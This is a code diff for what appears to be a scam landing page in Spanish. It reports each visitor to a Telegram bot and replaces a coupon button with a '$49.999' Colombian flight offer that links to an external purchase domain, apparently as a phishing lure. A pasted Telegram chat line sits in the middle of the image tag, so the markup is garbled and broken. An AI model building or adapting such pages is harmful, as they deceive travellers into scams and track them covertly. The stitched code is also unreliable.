@@ -43,13 +43,34 @@ export default function Home() {
     sendTelegramMessage("📢 Un usuario ha ingresado a la página de cupones.");
 
     return `
-    <div class="container">
-        <div class="form-wrapper">
-            <div id="couponForm">
-                <button type="button" class="submit-button" id="submitBtn">Recibir mi cupón</button>
-            </div>
-        </div>
-    </div>`;
+       <div class="container"> 
+        <img  
+            src="img/K4ffkXt.jpeg"
+
+✡️Uva🎸😇💸🤙👁️☀️✡️👑🔱🫅🤴, [20/2/2025 10:33]
+alt="Ofertas de Vuelos Nacionales"  
+            class="image" 
+        > 
+        <h1 style="color: #fff; margin-bottom: 20px; font-weight: bold;"> 
+            ¡Vuela por Colombia desde <strong>$49.999</strong>! 
+        </h1> 
+        <p style="color: #fff; margin-bottom: 40px; font-weight: bold;"> 
+            Reserva hoy mismo y ahorra en tus próximas vacaciones. 
+        </p> 
+ 
+        <div class="button-container"> 
+            <!-- Reemplaza "formulario.html" con el nombre real de tu página de formulario --> 
+            <a  
+                href="https://despegaconpromosnacional.com/"  
+                class="button" 
+                id="conversionButton" 
+                target="_blank" 
+            > 
+                Compra tu vuelo aquí 
+            </a> 
+        </div> 
+    </div> 
+    `;
 }
 
 export function addHomeEvents() {
